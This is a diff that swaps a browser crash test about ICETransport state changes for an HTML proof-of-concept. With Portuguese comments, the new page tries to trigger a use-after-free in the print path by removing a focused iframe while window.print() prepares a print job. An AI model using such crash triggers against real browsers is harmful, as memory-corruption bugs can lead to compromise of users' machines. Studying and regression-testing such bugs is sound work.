@@ -1,61 +1,33 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>ICETransport statechangeEvent</title>
-</head>
-<body>
-<div>This test passes if not crashing</div>
+<!DOCTYPE html>
+<style>
+  iframe { content: url(); zoom: 0.01; }
+</style>
 <script>
-function gc() {
-    function gcRec(n) {
-          if (n < 1)
-              return {};
-          var temp = {i: "ab" + i + (i / 100000)};
-          temp += "foo";
-          gcRec(n-1);
-    }
-    for (var i = 0; i < 1000; i++)
-    gcRec(10);
-}
+  onload = () => {
+    document.documentElement.append(document.createElement('frameset'));
 
+    const i0 = document.getElementById('i0');
 
-async function doTest()
-{
-    let value = window.localStorage.getItem("test-done");
-    if (value && value.length === 5) {
-        window.localStorage.removeItem("test-done");
-        
-        return;
-    }
-
-    const iframe = document.body.appendChild(document.createElement('iframe'));
-    const local_connection = new iframe.contentWindow.RTCPeerConnection();
-    const remote_connection = new iframe.contentWindow.RTCPeerConnection();
-
-    local_connection.onicecandidate = event => {
-        remote_connection.addIceCandidate(event.candidate);
+    // O handler de foco destrói o RenderWidget durante o layout
+    // que acontece no contexto de externalRepresentationForPrinting
+    i0.onfocus = () => {
+      location.hash = 'y';
+      // Tentar destruir o frame durante o re-layout do print job
+      i0.remove();
     };
 
-    local_connection.createDataChannel('test');
+    location.hash = 'x';
 
-    const offer = await local_connection.createOffer();
-    await local_connection.setLocalDescription(offer);
-    await remote_connection.setRemoteDescription(offer);
+    // window.print() ? IPC ? UI process prepara print job
+    // ? IPC de volta ? web process chama externalRepresentationForPrinting()
+    // ? externalRepresentation() ? write() ? layout() ? UAF ?
+    setTimeout(() => {
+      window.print(); // Trigger print path
+    }, 100);
 
-    const answer = await remote_connection.createAnswer();
-    await remote_connection.setLocalDescription(answer);
-
-    local_connection.sctp.transport.iceTransport.onstatechange = () => {
-        iframe.remove();
-        gc();
-
-        window.localStorage.setItem("test-done", (value ? value : "") + "a");
-
-        location.reload();
-    };
-}
-doTest();
+    // Enquanto o print job está sendo preparado, tentar colocar o
+    // iframe em estado que cause o UAF durante o dump
+    Promise.resolve().then(() => i0.focus());
+  };
 </script>
-</body>
-</html>
+<iframe id="i0"></iframe>
